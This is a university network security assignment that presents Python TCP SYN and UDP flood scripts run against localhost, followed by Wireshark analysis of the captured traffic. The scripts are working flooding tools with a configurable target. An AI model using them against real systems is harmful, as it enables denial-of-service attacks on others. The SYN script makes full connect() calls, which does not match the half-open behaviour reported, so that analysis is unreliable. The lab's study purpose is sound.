# Network Security
# Assignment - 1

**Submitted by**
Kavya Jain

**Submitted To**
Dr. Priyabrata Dash

School Of Computer Science
UNIVERSITY OF PETROLEUM & ENERGY STUDIES,
DEHRADUN- 248007. Uttarakhand

---
**GitHub Repository Link:** [https://github.com/KavyaJain321/DDoS_Simulation_Lab](https://github.com/KavyaJain321/DDoS_Simulation_Lab)

---

## TCP SYN Flood Simulation and Analysis

### Objective
To simulate a TCP SYN Flood attack using Python and analyze the generated network traffic using Wireshark.

### Tools Used
* Python
* Socket library
* Wireshark

### Python Script for SYN Flood

```python
import socket
import sys
import argparse
import time

def syn_flood(target_ip, target_port, num_packets):
    print(f"[*] Starting TCP SYN Flood Simulation against {target_ip}:{target_port}")
    print(f"[*] Sending {num_packets} packets...")
    
    sent = 0
    try:
        for i in range(num_packets):
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.5)
            try:
                s.connect((target_ip, target_port))
            except (socket.timeout, ConnectionRefusedError):
                pass
            finally:
                s.close()
            
            sent += 1
            if sent % 1000 == 0:
                print(f"  [+] Sent {sent}/{num_packets} connection attempts...")
                
    except KeyboardInterrupt:
        print("\n[*] Simulation stopped by user.")
    
    print(f"\n[✓] Simulation complete. Total attempts: {sent}")

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="TCP SYN Flood Simulation")
    parser.add_argument("--target", default="127.0.0.1", help="Target IP address")
    parser.add_argument("--port", type=int, default=80, help="Target port")
    parser.add_argument("--count", type=int, default=10000, help="Number of connection attempts")
    args = parser.parse_args()
    syn_flood(args.target, args.port, args.count)
```

### Steps Performed
1. Wrote a Python script using standard socket libraries to generate SYN packets.
2. Open Wireshark.
3. Select the Loopback network interface for capturing local traffic.
   ![Adapter Selection](c:\Users\Jain\Desktop\Network assignment\Adapter for loopback traffic capture.png)
4. Start packet capture.
5. Ran the Python script.
6. Stopped the capture after packets were generated.
7. Applied the following filter in Wireshark:
   `tcp.flags.syn == 1 && ip.dst == 127.0.0.1`

### Observations
During the packet capture, the following behavior was observed:
* Multiple TCP SYN packets were generated very rapidly.
* Random high-numbered source ports were used for each connection attempt.
* Destination port was 80.
* TCP handshake was not completed (no corresponding final `ACK` from the attacker).
* Wireshark showed retransmissions as the server attempted to complete the half-open connections.

### Example Wireshark Output
![SYN Flood Attack Capture](c:\Users\Jain\Desktop\Network assignment\WhatsApp Image 2026-03-17 at 1.02.40 PM.jpeg)

**Packet Capture Log Reference:** `SYN flood attack logs.pcapng`

### Result
The SYN flood simulation successfully generated a large number of SYN packets. Wireshark analysis confirmed the presence of repeated SYN packets and incomplete TCP handshakes, which are typical characteristics of SYN flood attack traffic.

---

## UDP Flood Simulation and Analysis

### Objective
To simulate a UDP Flood attack using Python and analyze the generated network traffic using Wireshark.

### Tools Used
* Python
* Socket library
* Wireshark

### Python Script for UDP Flood

```python
import socket
import sys
import argparse
import random
import time

def udp_flood(target_ip, target_port, num_packets, size):
    print(f"[*] Starting UDP Flood Simulation against {target_ip}:{target_port if target_port else 'RANDOM'}")
    print(f"[*] Sending {num_packets} packets (Payload size: {size} bytes)...")
    
    payload = random.randbytes(size)
    sent = 0
    
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        for i in range(num_packets):
            dport = target_port if target_port else random.randint(1, 65535)
            s.sendto(payload, (target_ip, dport))
            sent += 1
                
    except KeyboardInterrupt:
        print("\n[*] Simulation stopped by user.")
    finally:
        s.close()
    
    print(f"\n[✓] Simulation complete. Total packets sent: {sent}")

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="UDP Flood Simulation")
    parser.add_argument("--target", default="127.0.0.1", help="Target IP address")
    parser.add_argument("--port", type=int, default=80, help="Target port")
    parser.add_argument("--count", type=int, default=100000, help="Number of packets")
    parser.add_argument("--size", type=int, default=1024, help="Payload size")
    args = parser.parse_args()
    udp_flood(args.target, args.port, args.count, args.size)
```

### Steps Performed
1. Open Wireshark.
2. Select the Loopback network interface.
3. Start packet capture.
4. Run the UDP flood Python script.
5. Stop the capture after packets are generated.
6. Apply the following filter to analyze UDP traffic:

### Wireshark Filter Used
`udp && ip.dst == 127.0.0.1`
This filter displays only UDP packets directed at the target IP in the capture.

### Observations
During the packet capture, the following behavior was observed:
* A large number of UDP packets were generated in a very short time.
* All packets were sent to the same destination port (80).
* Packet sizes were uniform and exactly matched the 1024-byte payload size defined in the script.
* Source and destination IP addresses were both `127.0.0.1` because the simulation was performed on the local machine.
* Repeated ICMP `Destination Unreachable (Port unreachable)` replies were generated by the system.

### Example packet format observed in Wireshark
![UDP Flood Capture 1](c:\Users\Jain\Desktop\Network assignment\UDP Flood logs.png)

![UDP Flood Capture 2](c:\Users\Jain\Desktop\Network assignment\WhatsApp Image 2026-03-17 at 1.06.38 PM.jpeg)

**Packet Capture Log Reference:** `UDP Flood logs.pcapng`

### Result
The UDP flood simulation successfully generated a high number of UDP packets. Wireshark analysis confirmed the presence of continuous UDP traffic directed toward the target port, alongside massive bandwidth consumption. Such behavior is characteristic of a UDP Flood Denial-of-Service attack, where a system's network capacity is overwhelmed with excessive UDP packets.
